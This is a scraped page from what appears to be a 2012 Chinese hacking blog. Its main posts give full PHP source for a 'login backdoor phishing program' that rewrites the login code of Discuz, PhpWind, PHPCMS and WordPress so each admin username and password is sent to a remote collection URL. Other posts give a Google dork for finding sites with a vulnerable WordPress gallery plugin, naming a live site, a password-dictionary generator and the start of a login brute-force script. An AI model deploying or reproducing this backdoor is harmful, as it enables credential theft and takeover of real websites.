 <span class="variable">$replace</span> = <span class="string">'file_get_contents(&quot;'</span>.<span class="variable">$rHostPath</span>.<span class="string">'&quot;);'</span>.<span class="variable">$cmsCode</span>[<span class="string">'bedeck'</span>].<span class="variable">$keyword</span>;
 <span class="variable">$loginPageContent</span> = file_get_contents(<span class="variable">$relPath</span>);
 <span class="variable">$loginPageContent</span> = str_replace(<span class="variable">$keyword</span>, <span class="variable">$replace</span>, <span class="variable">$loginPageContent</span>);
 <span class="keyword">if</span>(file_put_contents(<span class="variable">$relPath</span>, <span class="variable">$loginPageContent</span>)){
 tipAmessage(<span class="string">'成功插入！'</span>);
 }<span class="keyword">else</span>{
 tipAmessage(<span class="string">'插入失败！'</span>);
 }
}

<span class="function"><span class="keyword">function</span> <span class="title">tipAmessage</span><span class="params">(<span class="variable">$msg</span>)</span>{</span>
 <span class="keyword">global</span> <span class="variable">$error</span>;
 <span class="variable">$error</span> = <span class="variable">$msg</span>;
}
<span class="comment">/**
 * 各类cms登录标识码和文件路径
 *
 * $code说明：
 * $code['keyword'] 关键字，就是要插入代码的特征码
 * $code['bedeck'] 修饰符用来修正代码的外观
 * $code['uname'] 用户名变量名
 * $code['pwd'] 密码变量名
 * $code['mothed'] 密码提交方式：POST 或者 GET
 * $code['path'] 登录文件路径
 * 注意事项：
 * 由于登录口不同程序可能有多个登录方法，正常登录
 * 或者ajax或者第三方登录，所以登录点的关键词必须找准
 */</span>
<span class="function"><span class="keyword">function</span> <span class="title">switchCms</span><span class="params">(<span class="variable">$cmsName</span>)</span>{</span>
 <span class="variable">$code</span> = <span class="keyword">array</span>();
 <span class="keyword">switch</span> (<span class="variable">$cmsName</span>) {
 <span class="keyword">case</span> <span class="string">'phpcmsV9'</span>:
 <span class="variable">$code</span>[<span class="string">'path'</span>] = <span class="string">'phpcms/modules/admin/index.php'</span>;
 <span class="variable">$code</span>[<span class="string">'keyword'</span>] = &quot;showmessage(L(<span class="string">'login_success'</span>),<span class="string">'?m=admin&amp;c=index'</span>);&quot;;
 <span class="variable">$code</span>[<span class="string">'bedeck'</span>] = &quot;nttt&quot;;
 <span class="variable">$code</span>[<span class="string">'uname'</span>] = <span class="string">'username'</span>;
 <span class="variable">$code</span>[<span class="string">'pwd'</span>] = <span class="string">'password'</span>;
 <span class="variable">$code</span>[<span class="string">'mothed'</span>] = <span class="string">'post'</span>;
 <span class="keyword">break</span>;
 <span class="keyword">case</span> <span class="string">'dedecms'</span>:
 <span class="keyword">break</span>;
 <span class="keyword">case</span> <span class="string">'dz'</span>:
 <span class="variable">$code</span>[<span class="string">'path'</span>] = <span class="string">'source/class/class_admincp.php'</span>;
 <span class="variable">$code</span>[<span class="string">'keyword'</span>] = &quot;<span class="variable">$cpgroupid</span> = DB::result_first&quot;;
 <span class="variable">$code</span>[<span class="string">'bedeck'</span>] = &quot;nttttt&quot;;
 <span class="variable">$code</span>[<span class="string">'uname'</span>] = <span class="string">'admin_username'</span>;
 <span class="variable">$code</span>[<span class="string">'pwd'</span>] = <span class="string">'admin_password'</span>;
 <span class="variable">$code</span>[<span class="string">'mothed'</span>] = <span class="string">'post'</span>;
 <span class="keyword">break</span>;
 <span class="keyword">case</span> <span class="string">'phpwind'</span>:
 <span class="variable">$code</span>[<span class="string">'path'</span>] = <span class="string">'admin/admincp.php'</span>;
 <span class="variable">$code</span>[<span class="string">'keyword'</span>] = &quot;<span class="variable">$REQUEST_URI</span> = trim(<span class="variable">$REQUEST_URI</span>,<span class="string">'?#'</span>);&quot;;
 <span class="variable">$code</span>[<span class="string">'bedeck'</span>] = &quot;nt&quot;;
 <span class="variable">$code</span>[<span class="string">'uname'</span>] = <span class="string">'admin_name'</span>;
 <span class="variable">$code</span>[<span class="string">'pwd'</span>] = <span class="string">'admin_pwd'</span>;
 <span class="variable">$code</span>[<span class="string">'mothed'</span>] = <span class="string">'post'</span>;
 <span class="keyword">break</span>;
 <span class="keyword">case</span> <span class="string">'wordpress'</span>:
 <span class="variable">$code</span>[<span class="string">'path'</span>] = <span class="string">'wp-includes/user.php'</span>;
 <span class="variable">$code</span>[<span class="string">'keyword'</span>] = &quot;<span class="variable">$user</span> = <span class="keyword">new</span> WP_User(<span class="variable">$userdata</span>-&gt;ID);&quot;;
 <span class="variable">$code</span>[<span class="string">'bedeck'</span>] = &quot;nt&quot;;
 <span class="variable">$code</span>[<span class="string">'uname'</span>] = <span class="string">'log'</span>;
 <span class="variable">$code</span>[<span class="string">'pwd'</span>] = <span class="string">'pwd'</span>;
 <span class="variable">$code</span>[<span class="string">'mothed'</span>] = <span class="string">'post'</span>;
 <span class="keyword">break</span>;
 <span class="keyword">default</span>:
 ;
 <span class="keyword">break</span>;
 }
 <span class="keyword">return</span> <span class="variable">$code</span>;

}
<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">'creack'</span>]) &amp;&amp; <span class="variable">$_POST</span>[<span class="string">'creack'</span>] != <span class="string">''</span>){
 <span class="variable">$webRoot</span> = <span class="variable">$_SERVER</span>[<span class="string">'DOCUMENT_ROOT'</span>]; <span class="comment">//当前目录</span>
 <span class="variable">$dir</span> = <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">'dir'</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">'dir'</span>]) ? trim(<span class="variable">$_POST</span>[<span class="string">'dir'</span>]) : <span class="string">''</span>;
 <span class="variable">$cms</span> = <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">'cms'</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">'cms'</span>]) ? trim(<span class="variable">$_POST</span>[<span class="string">'cms'</span>]) : <span class="string">''</span>;
 <span class="variable">$cmsCode</span> = switchCms(<span class="variable">$_POST</span>[<span class="string">'cms'</span>]);
 <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$cmsCode</span>)){
 <span class="variable">$error</span> = <span class="string">'没找到可用CMS或者BBS'</span>;
 }<span class="keyword">else</span>{
 <span class="variable">$relPath</span> = <span class="variable">$webRoot</span>.<span class="variable">$dir</span>.<span class="variable">$cmsCode</span>[<span class="string">'path'</span>];
 <span class="keyword">if</span>(file_exists(<span class="variable">$relPath</span>)){
 inSertPwdDoor(<span class="variable">$cmsCode</span>,<span class="variable">$relPath</span>);
 }<span class="keyword">else</span>{
 tipAmessage(<span class="string">'没有找到该文件路径：'</span>.<span class="variable">$relPath</span>);
 }
 }
}
</pre></td></tr></table></figure>

<p>
      
    </div>
    <footer>
      
        
          <div class="alignleft">
            <a href="/html/2012-07-04-登录后门钓鱼程序-v2-0.html#more" class="more-link">Read More</a>
          </div>
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>



  
    
<article class="post">
  
    <div class="gallery">
  <div class="photoset">
    
      <img src="">
    
  </div>
  <div class="control">
    <div class="prev"></div>
    <div class="next"></div>
  </div>
</div>
  
  <div class="post-content">
  <header>
      
      
  
    <h1 class="title"><a href="/html/2012-07-03-登录后门钓鱼程序-v1-0.html">登录后门钓鱼程序 V1.0</a></h1>
  

      <time datetime="2012-07-02T17:32:15.000Z"><a href="/html/2012-07-03-登录后门钓鱼程序-v1-0.html">7月 3 2012</a></time>
      
  </header>
    <div class="entry">
      
        <p>现在的各大cms也好bbs也好。对于用户的加密方式已经不仅仅局限于md5(密码)了。大家都知道一次md5加密的密码，</p>
<p>如果系统一旦有注入漏洞被获取到加密后的密码通过一些付费或者免费的网站是完全可以破解密码的，而现在那些主流</p>
<p>cms或者bbs加密方式越来月多样化了，导致即使拿到管理员数据库中的加密密码也没用了，所有就有了这个程序。</p>
<p>先上代码：</p>
<p>程序端:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre>1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
</pre></td><td class="code"><pre><span class="preprocessor">&lt;?php</span>
<span class="comment">/**
 +-----------------------------------------------------------------
 * 登录后门钓鱼程序 V1.0
 +-----------------------------------------------------------------
 * 功能介绍：
 * 本程序会根据所选cms和BBS系统自动插入钓鱼后门
 * 后续将完善支持PHP的主流的cms和bbs系统
 * 本程序仅供学习参考，请勿非法用途 ，请保留版权信息
 +-----------------------------------------------------------------
 * 作者： Return Blogs: www.creturn.com
 +-----------------------------------------------------------------
 **/</span>
error_reporting(<span class="number">0</span>);
<span class="variable">$rHost</span> = <span class="string">'http://192.168.1.199/MyProject/server/sever.php'</span>; <span class="comment">//定义接收地址</span>
<span class="variable">$pUname</span> = <span class="string">'uname'</span>; <span class="comment">//远程端接收用户名参数</span>
<span class="variable">$pPwd</span> = <span class="string">'pwd'</span>; <span class="comment">//定义远程接收密码参数</span>
<span class="variable">$error</span> = <span class="string">''</span>;
<span class="comment">/**
 * 插入代码
 */</span>
<span class="function"><span class="keyword">function</span> <span class="title">inSertPwdDoor</span><span class="params">(<span class="variable">$cmsCode</span>,<span class="variable">$relPath</span>)</span>{</span>
 <span class="keyword">global</span> <span class="variable">$rHost</span>,<span class="variable">$pUname</span>,<span class="variable">$pPwd</span>;
 <span class="comment">//读取用户名密码特制</span>
 <span class="keyword">if</span>(<span class="variable">$cmsCode</span>[<span class="string">'mothed'</span>] == <span class="string">'post'</span>){
 <span class="variable">$rHostPath</span> = <span class="variable">$rHost</span>.<span class="string">'?'</span>.<span class="variable">$pUname</span>.<span class="string">'=$_POST['</span>.<span class="variable">$cmsCode</span>[<span class="string">'uname'</span>].<span class="string">']&amp;'</span>.<span class="variable">$pPwd</span>.<span class="string">'=$_POST['</span>.<span class="variable">$cmsCode</span>[<span class="string">'pwd'</span>].<span class="string">']'</span>;
 }<span class="keyword">else</span>{
 <span class="variable">$rHostPath</span> = <span class="variable">$rHost</span>.<span class="string">'?'</span>.<span class="variable">$pUname</span>.<span class="string">'=$_GET['</span>.<span class="variable">$cmsCode</span>[<span class="string">'uname'</span>].<span class="string">']&amp;'</span>.<span class="variable">$pPwd</span>.<span class="string">'=$_GET['</span>.<span class="variable">$cmsCode</span>[<span class="string">'pwd'</span>].<span class="string">']'</span>;
 }
 <span class="comment">//获取插入代码</span>
 <span class="variable">$keyword</span> = <span class="variable">$cmsCode</span>[<span class="string">'keyword'</span>];
 <span class="variable">$replace</span> = <span class="string">'file_get_contents(&quot;'</span>.<span class="variable">$rHostPath</span>.<span class="string">'&quot;);'</span>.<span class="variable">$cmsCode</span>[<span class="string">'bedeck'</span>].<span class="variable">$keyword</span>;
 <span class="variable">$loginPageContent</span> = file_get_contents(<span class="variable">$relPath</span>);
 <span class="variable">$loginPageContent</span> = str_replace(<span class="variable">$keyword</span>, <span class="variable">$replace</span>, <span class="variable">$loginPageContent</span>);
 <span class="keyword">if</span>(file_put_contents(<span class="variable">$relPath</span>, <span class="variable">$loginPageContent</span>)){
 tipAmessage(<span class="string">'成功插入！'</span>);
 }<span class="keyword">else</span>{
 tipAmessage(<span class="string">'插入失败！'</span>);
 }
}

<span class="function"><span class="keyword">function</span> <span class="title">tipAmessage</span><span class="params">(<span class="variable">$msg</span>)</span>{</span>
 <span class="keyword">global</span> <span class="variable">$error</span>;
 <span class="variable">$error</span> = <span class="variable">$msg</span>;
}
<span class="comment">/**
 * 各类cms登录标识码和文件路径
 *
 * $code说明：
 * $code['keyword'] 关键字，就是要插入代码的特征码
 * $code['bedeck'] 修饰符用来修正代码的外观
 * $code['uname'] 用户名变量名
 * $code['pwd'] 密码变量名
 * $code['mothed'] 密码提交方式：POST 或者 GET
 * $code['path'] 登录文件路径
 * 注意事项：
 * 由于登录口不同程序可能有多个登录方法，正常登录
 * 或者ajax或者第三方登录，所以登录点的关键词必须找准
 */</span>
<span class="function"><span class="keyword">function</span> <span class="title">switchCms</span><span class="params">(<span class="variable">$cmsName</span>)</span>{</span>
 <span class="variable">$code</span> = <span class="keyword">array</span>();
 <span class="keyword">switch</span> (<span class="variable">$cmsName</span>) {
 <span class="keyword">case</span> <span class="string">'phpcmsV9'</span>:
 <span class="variable">$code</span>[<span class="string">'path'</span>] = <span class="string">'phpcms/modules/admin/index.php'</span>;
 <span class="variable">$code</span>[<span class="string">'keyword'</span>] = &quot;showmessage(L(<span class="string">'login_success'</span>),<span class="string">'?m=admin&amp;c=index'</span>);&quot;;
 <span class="variable">$code</span>[<span class="string">'bedeck'</span>] = &quot;nttt&quot;;
 <span class="variable">$code</span>[<span class="string">'uname'</span>] = <span class="string">'username'</span>;
 <span class="variable">$code</span>[<span class="string">'pwd'</span>] = <span class="string">'password'</span>;
 <span class="variable">$code</span>[<span class="string">'mothed'</span>] = <span class="string">'post'</span>;
 <span class="keyword">break</span>;
 <span class="keyword">case</span> <span class="string">'phpwind'</span>:
 <span class="variable">$code</span>[<span class="string">'path'</span>] = <span class="string">'admin/admincp.php'</span>;
 <span class="variable">$code</span>[<span class="string">'keyword'</span>] = &quot;<span class="variable">$REQUEST_URI</span> = trim(<span class="variable">$REQUEST_URI</span>,<span class="string">'?#'</span>);&quot;;
 <span class="variable">$code</span>[<span class="string">'bedeck'</span>] = &quot;nt&quot;;
 <span class="variable">$code</span>[<span class="string">'uname'</span>] = <span class="string">'admin_name'</span>;
 <span class="variable">$code</span>[<span class="string">'pwd'</span>] = <span class="string">'admin_pwd'</span>;
 <span class="variable">$code</span>[<span class="string">'mothed'</span>] = <span class="string">'post'</span>;
 <span class="keyword">break</span>;
 }
 <span class="keyword">return</span> <span class="variable">$code</span>;

}
<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">'creack'</span>]) &amp;&amp; <span class="variable">$_POST</span>[<span class="string">'creack'</span>] != <span class="string">''</span>){
 <span class="variable">$webRoot</span> = <span class="variable">$_SERVER</span>[<span class="string">'DOCUMENT_ROOT'</span>]; <span class="comment">//当前目录</span>
 <span class="variable">$dir</span> = <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">'dir'</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">'dir'</span>]) ? trim(<span class="variable">$_POST</span>[<span class="string">'dir'</span>]) : <span class="string">''</span>;
 <span class="variable">$cms</span> = <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">'cms'</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">'cms'</span>]) ? trim(<span class="variable">$_POST</span>[<span class="string">'cms'</span>]) : <span class="string">''</span>;
 <span class="variable">$cmsCode</span> = switchCms(<span class="variable">$_POST</span>[<span class="string">'cms'</span>]);
 <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$cmsCode</span>)){
 <span class="variable">$error</span> = <span class="string">'没找到可用CMS或者BBS'</span>;
 }<span class="keyword">else</span>{
 <span class="variable">$relPath</span> = <span class="variable">$webRoot</span>.<span class="variable">$dir</span>.<span class="variable">$cmsCode</span>[<span class="string">'path'</span>];
 <span class="keyword">if</span>(file_exists(<span class="variable">$relPath</span>)){
 inSertPwdDoor(<span class="variable">$cmsCode</span>,<span class="variable">$relPath</span>);
 }<span class="keyword">else</span>{
 tipAmessage(<span class="string">'没有找到该文件路径：'</span>.<span class="variable">$relPath</span>);
 }
 }
}
<span class="preprocessor">?&gt;</span>
&lt;!DOCTYPE html <span class="keyword">PUBLIC</span> &quot;-<span class="comment">//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;</span>
&lt;html xmlns=&quot;http:<span class="comment">//www.w3.org/1999/xhtml&quot;&gt;</span>
&lt;head&gt;
&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-<span class="number">8</span>&quot; /&gt;
&lt;title&gt;自动插入语句&lt;/title&gt;
&lt;style type=&quot;text/css&quot;&gt;
*{
font-size:<span class="number">14</span>px;
line-height:<span class="number">20</span>px;
}
div{
 width:<span class="number">450</span>px;
 margin: <span class="number">0</span>px auto;
}

&lt;/style&gt;
&lt;/head&gt;

&lt;body&gt;
&lt;div style=&quot;width:<span class="number">600</span>px;margin: <span class="number">0</span>px auto;padding-top: <span class="number">50</span>px;padding-bottom: <span class="number">50</span>px; border: <span class="number">1</span>px <span class="comment">#fff012 solid;&quot;&gt;</span>
&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;
 &lt;div&gt;
 &lt;h2 style=&quot;text-align: center;&quot;&gt;登录后门钓鱼程序 V1<span class="number">.0</span> &lt;/h2&gt;
 &lt;/div&gt;
 &lt;div&gt;
 &lt;h4 style=&quot;color: red&quot;&gt;注意：Path参数，默认根目录不用填写，如果目标程序在子目录中请填入路径&lt;/h4&gt;
 &lt;/div&gt;
 &lt;div&gt;
 当前文件路径：&lt;?php <span class="keyword">echo</span> <span class="keyword">__FILE__</span>?&gt;&lt;br/&gt;
 &lt;/div&gt;
 &lt;div&gt;
 &lt;input type=&quot;radio&quot; value=&quot;dz&quot; name=&quot;cms&quot; id=&quot;dzcms&quot; /&gt;&lt;label <span class="keyword">for</span>=&quot;dzcms&quot;&gt;Discuz&lt;/label&gt;
 &lt;input type=&quot;radio&quot; value=&quot;phpwind&quot; name=&quot;cms&quot; id=&quot;phpwind&quot; /&gt;&lt;label <span class="keyword">for</span>=&quot;phpwind&quot;&gt;PhpWind&lt;/label&gt;
 &lt;input type=&quot;radio&quot; value=&quot;phpcmsV9&quot; name=&quot;cms&quot; id=&quot;v9cms&quot; /&gt;&lt;label <span class="keyword">for</span>=&quot;v9cms&quot;&gt;PHPCMSv9&lt;/label&gt;
 &lt;input type=&quot;radio&quot; value=&quot;dedecms&quot; name=&quot;cms&quot; id=&quot;dedecms&quot; /&gt;&lt;label <span class="keyword">for</span>=&quot;dedecms&quot;&gt;DedeCms&lt;/label&gt;
 &lt;input type=&quot;radio&quot; value=&quot;wordpress&quot; name=&quot;cms&quot; id=&quot;wrodpress&quot; /&gt;&lt;label <span class="keyword">for</span>=&quot;wrodpress&quot;&gt;WordPress&lt;/label&gt;
 &lt;/div&gt;

 &lt;div&gt;
 &lt;span&gt;Path:&lt;/span&gt;&lt;/span&gt;&lt;input type=&quot;text&quot; name=&quot;dir&quot; /&gt;
 &lt;input type=&quot;submit&quot; name=&quot;creack&quot; value=&quot;插入后门&quot; /&gt;
 &lt;/div&gt;
 &lt;div style=&quot;text-align: left; color: red; margin-top:<span class="number">20</span>px;&quot;&gt;消息：&lt;?php <span class="keyword">echo</span> <span class="variable">$error</span>;?&gt;&lt;/div&gt;
&lt;/form&gt;
&lt;/div&gt;
&lt;/body&gt;
&lt;/html&gt;
</pre></td></tr></table></figure>

<p>
      
    </div>
    <footer>
      
        
          <div class="alignleft">
            <a href="/html/2012-07-03-登录后门钓鱼程序-v1-0.html#more" class="more-link">Read More</a>
          </div>
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>



  
    
<article class="post">
  
    <div class="gallery">
  <div class="photoset">
    
      <img src="">
    
  </div>
  <div class="control">
    <div class="prev"></div>
    <div class="next"></div>
  </div>
</div>
  
  <div class="post-content">
  <header>
      
      
  
    <h1 class="title"><a href="/html/2012-07-02-wordpress-fancy-gallery-plugin-1-2-4-漏洞利用.html">Wordpress Fancy Gallery Plugin 1.2.4 漏洞利用</a></h1>
  

      <time datetime="2012-07-01T16:49:58.000Z"><a href="/html/2012-07-02-wordpress-fancy-gallery-plugin-1-2-4-漏洞利用.html">7月 2 2012</a></time>
      
  </header>
    <div class="entry">
      
        <p>睡觉前习惯性的上<a href="http://www.exploit-db.com/看看有没有什么新出的漏洞，" target="_blank">http://www.exploit-db.com/看看有没有什么新出的漏洞，</a></p>
<p>刚好看到一个Wordpress Fancy Gallery Plugin 1.2.4的上传漏洞</p>
<p>额，其实如果是注入漏洞的话我就不看了，上传漏洞一般就是直接能够上传自己的shell后门，这样比较省事。</p>
<p>先找一个有fancy gallery plugin的漏洞网站，google关键词：inurl:/wp-content/plugins/radykal-fancy-gallery/</p>
<p>随便点击一个进去看了看：<a href="http://progressivepulse.com" target="_blank">http://progressivepulse.com</a> 发现这个网站确实存在此插件并且有列目录漏洞</p>
<p><a href="http://asset.creturn.com/asset/uploads/2012/07/pro1.png" target="_blank"><img src="http://asset.creturn.com/asset/uploads/2012/07/pro1.png" alt="" title="pro1"></a>

      
    </div>
    <footer>
      
        
          <div class="alignleft">
            <a href="/html/2012-07-02-wordpress-fancy-gallery-plugin-1-2-4-漏洞利用.html#more" class="more-link">Read More</a>
          </div>
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>



  
    
<article class="post">
  
    <div class="gallery">
  <div class="photoset">
    
      <img src="">
    
  </div>
  <div class="control">
    <div class="prev"></div>
    <div class="next"></div>
  </div>
</div>
  
  <div class="post-content">
  <header>
      
      
  
    <h1 class="title"><a href="/html/2012-07-01-字典生成工具之排列组合.html">字典生成工具之排列组合</a></h1>
  

      <time datetime="2012-07-01T06:35:37.000Z"><a href="/html/2012-07-01-字典生成工具之排列组合.html">7月 1 2012</a></time>
      
  </header>
    <div class="entry">
      
        <p>这个工具还是前几天玩那个hackGame游戏写的，当时游戏需要组合一个字典进行爆破，但是当时手里没有字典生成工具，另外一个原因是题目的要求基本上市面上见到的那些基本完成不了需求，所以就只能自己写了。</p>
<p>字典的功能是 在&#39;f4ck &#39;字符加上0-9组成五位数字的随机密码。</p>
<p>还是上代码先Python的：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre>1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
</pre></td><td class="code"><pre>
<span class="comment">#coding: utf-8</span>
<span class="string">'''
Created on 2012-6-28

@author: Return
'''</span>
<span class="keyword">import</span> time

<span class="comment">#===============================================================================</span>
<span class="comment"># runk_list 对数据进行排列组合</span>
<span class="comment">#===============================================================================</span>
<span class="function"><span class="keyword">def</span> <span class="title">runk_list</span><span class="params">(seq)</span>:</span>
 seqn = [seq.pop()]
 <span class="keyword">while</span> seq:
 newseq = []
 new = seq.pop()
 <span class="keyword">for</span> i <span class="keyword">in</span> range(len(seqn)):
 item = seqn[i]
 <span class="keyword">for</span> j <span class="keyword">in</span> range(len(item)+<span class="number">1</span>):
 newseq.append(<span class="string">''</span>.join([item[:j],new,item[j:]]))
 seqn = newseq
 <span class="keyword">return</span> seqn

<span class="comment">#===============================================================================</span>
<span class="comment"># out_file 进行文件输出操作</span>
<span class="comment">#===============================================================================</span>
<span class="function"><span class="keyword">def</span> <span class="title">out_file</span><span class="params">(pwdList)</span>:</span>
 fileName = <span class="string">'third_pwd.txt'</span>
 fp = open(fileName,<span class="string">'a'</span>)
 <span class="keyword">for</span> pwd <span class="keyword">in</span> pwdList:
 fp.write(pwd+<span class="string">'n'</span>)
 fp.close()

<span class="comment">#===============================================================================</span>
<span class="comment"># factory_list 加工需要排列组合的数据</span>
<span class="comment">#===============================================================================</span>
<span class="function"><span class="keyword">def</span> <span class="title">factory_list</span><span class="params">()</span>:</span>
 key = [<span class="string">'f'</span>,<span class="string">'9'</span>,<span class="string">'c'</span>,<span class="string">'k'</span>] <span class="comment">#固定字符</span>
 <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>): <span class="comment">#密码(0-9)+key五位随机生成新key后进行排列组合</span>
 newKey = key[:]
 newKey.append(str(i))
 newRunk = runk_list(newKey)
 out_file(newRunk)

<span class="keyword">print</span> <span class="string">'CreatDict...'</span>
time1 = time.time() <span class="comment">#定义起始时间</span>
factory_list()
time2 = time.time() <span class="comment">#运行结束时间</span>
<span class="keyword">print</span> <span class="string">'run time:'</span>, time2 - time1 <span class="comment">#输出并计算运行时间，查看运行效率</span>
</pre></td></tr></table></figure>

<p>其中runk_list 方法可以单独拿出来用作排列组合密码生成。</p>

	 
	     <p style="margin:20px 0; color:#9f9f9f; font-size:12px;">
<span>Posted by <a style="color:#9f9f9f;" href="null"><strong>creturn</strong></a> - 7月 1 2012</span><br />
<span style="line-height:13px;">如需转载，请注明： 本文来自 <a style="color:#9f9f9f;" href="http://creturn.com"><strong>Return&#39;s Blog </strong></a></span>
</p>
       	 
      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>



  
    
<article class="post">
  
    <div class="gallery">
  <div class="photoset">
    
      <img src="">
    
  </div>
  <div class="control">
    <div class="prev"></div>
    <div class="next"></div>
  </div>
</div>
  
  <div class="post-content">
  <header>
      
      
  
    <h1 class="title"><a href="/html/2012-07-01-backtrack5-armitage-自动化攻击演示.html">Backtrack5 armitage 自动化攻击演示</a></h1>
  

      <time datetime="2012-07-01T05:33:52.000Z"><a href="/html/2012-07-01-backtrack5-armitage-自动化攻击演示.html">7月 1 2012</a></time>
      
  </header>
    <div class="entry">
      
        <p>这段视频是之前进一个论坛获取邀请码的一个作品，视频介绍了如何通过 Backtrack5 平台 下的armitage进行自动化攻击，并且完全控制目标主机</p>
<p>armitage其实就是msf的一个GUI前端工具。本视频就是通过它来进行演示自动化攻击，其中也演示了两款不错的软件，</p>
<p>具体的大家自己看吧。</p>
<p>优酷上也传了一份但是很不清晰，视频录制过程中采用的是vm自带的录制工具所以效果及其差，也比较卡顿...</p>
<object width="100%"  classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,40,0" align="middle"><param name="src" value="http://player.youku.com/player.php/sid/XNDExODA1Mjgw/v.swf" /><param name="allowfullscreen" value="true" /><param name="quality" value="high" /><param name="allowscriptaccess" value="always" /><embed width="100%" height="400" type="application/x-shockwave-flash" src="http://player.youku.com/player.php/sid/XNDExODA1Mjgw/v.swf" allowfullscreen="true" quality="high" allowscriptaccess="always" align="middle" /></object>

<p>下载地址：<a href="http://www.kuaipan.cn/file/id_22592043373042208.html" target="_blank"><a href="http://www.kuaipan.cn/file/id_22592043373042208.html">http://www.kuaipan.cn/file/id_22592043373042208.html</a></a></p>

	 
	     <p style="margin:20px 0; color:#9f9f9f; font-size:12px;">
<span>Posted by <a style="color:#9f9f9f;" href="null"><strong>creturn</strong></a> - 7月 1 2012</span><br />
<span style="line-height:13px;">如需转载，请注明： 本文来自 <a style="color:#9f9f9f;" href="http://creturn.com"><strong>Return&#39;s Blog </strong></a></span>
</p>
       	 
      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>



  
    
<article class="post">
  
    <div class="gallery">
  <div class="photoset">
    
      <img src="">
    
  </div>
  <div class="control">
    <div class="prev"></div>
    <div class="next"></div>
  </div>
</div>
  
  <div class="post-content">
  <header>
      
      
  
    <h1 class="title"><a href="/html/2012-07-01-无验证码web爆破工具.html">无验证码web爆破工具</a></h1>
  

      <time datetime="2012-07-01T05:15:26.000Z"><a href="/html/2012-07-01-无验证码web爆破工具.html">7月 1 2012</a></time>
      
  </header>
    <div class="entry">
      
        <p>这个其实是前几天玩一个hackGame里面的题目，自己写的爆破工具</p>
<p>上代码：</p>
<h2 id="php-">PHP版本</h2>
<figure class="highlight php"><table><tr><td class="gutter"><pre>1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
</pre></td><td class="code"><pre><span class="preprocessor">&lt;?php</span>
set_time_limit(<span class="number">0</span>);
<span class="variable">$pwd</span> = <span class="string">'password/pwdt.txt'</span>; <span class="comment">//密码文件</span>
<span class="variable">$rhost</span> = <span class="string">'http://127.0.0.1/test/test.php'</span>; <span class="comment">//POST数据地址</span>
<span class="variable">$file</span> = fopen(<span class="variable">$pwd</span>, <span class="string">'r'</span>);<span class="comment">//初始化文件句柄</span>
<span class="variable">$curl</span> = curl_init();<span class="comment">//初始化</span>

<span class="comment">//设置参数</span>

curl_setopt(<span class="variable">$curl</span>, CURLOPT_URL, <span class="variable">$rhost</span>);<span class="comment">//设置目标地址</span>
curl_setopt(<span class="variable">$curl</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);<span class="comment">//设置接收反馈内容</span>
curl_setopt(<span class="variable">$curl</span>, CURLOPT_HEADER, <span class="number">0</span>);
curl_setopt(<span class="variable">$curl</span>, CURLOPT_POST, <span class="number">1</span>);<span class="comment">//设置提交方式为POST</span>

<span class="keyword">while</span> (!feof(<span class="variable">$file</span>)){

 <span class="variable">$fpwd</span> = trim(fgets(<span class="variable">$file</span>));

 <span class="variable">$post_data</span> = <span class="keyword">array</span>(<span class="string">'password'</span>=&gt;<span class="variable">$fpwd</span>); <span class="comment">//POST提交数据</span>
 curl_setopt(<span class="variable">$curl</span>, CURLOPT_POSTFIELDS, <span class="variable">$post_data</span>);
 <span class="comment">//执行提交内容</span>
 curl_exec(<span class="variable">$curl</span>);
 <span class="comment">//获取状态反馈信息组</span>
 <span class="variable">$rsinfo</span> = curl_getinfo(<span class="variable">$curl</span>);
 <span class="keyword">if</span>(intval(<span class="variable">$rsinfo</span>[<span class="string">'http_code'</span>])== <span class="number">302</span>){
 file_put_contents(<span class="string">'pwd.txt'</span>, <span class="variable">$fpwd</span>);
